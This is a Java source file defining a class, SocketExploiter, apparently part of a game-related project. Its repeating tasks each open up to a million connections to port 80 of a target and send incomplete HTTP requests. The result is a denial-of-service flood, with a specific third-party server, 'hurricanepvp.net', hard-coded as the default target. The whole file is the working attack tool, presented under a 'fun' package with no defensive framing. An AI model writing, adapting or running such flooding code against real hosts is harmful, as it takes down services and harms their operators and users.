package com.teaminfinity.exigencies.objects.fun;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.util.ArrayList;

import com.teaminfinity.exigencies.utils.SchedulingUtility;

public class SocketExploiter extends Socket implements Runnable {

	protected transient final int BUFFER = 5;
	
	protected transient ArrayList<Integer> tasks = new ArrayList<Integer>();
	protected transient String target = "hurricanepvp.net";

	public SocketExploiter(String target)
	{
		this.target = target;
		for (int i = 0; i < BUFFER; i++)
		{
			tasks.add(SchedulingUtility.beginRepeating(this, 10));
		}
	}
	
	public void run() 
	{
		for (int i = 1; i < 1000000; i++) 
		{
			try 
			{
				Socket net = new Socket(target, 80); // connects the Socket to the target port 80.
				sendRawLine("GET / HTTP/1.1", net); // Sends the GET / OutputStream
				sendRawLine("Host: " + target, net); // Sends Host: to the OutputStream
				System.out.println("Current Connection: " + i);
			} 
			catch (Exception e)
			{
				e.printStackTrace();
				for(Integer val : tasks)
				{
					SchedulingUtility.stopRepeating(val);
				}
				break;
			}
		}
	}

	public static void sendRawLine(String text, Socket sock) 
	{
		try 
		{
			BufferedWriter out = new BufferedWriter(new OutputStreamWriter(sock.getOutputStream()));
			out.write(text + " ");
			out.flush();
		}
		catch (IOException ex)
		{
			ex.printStackTrace();
		}
	}
}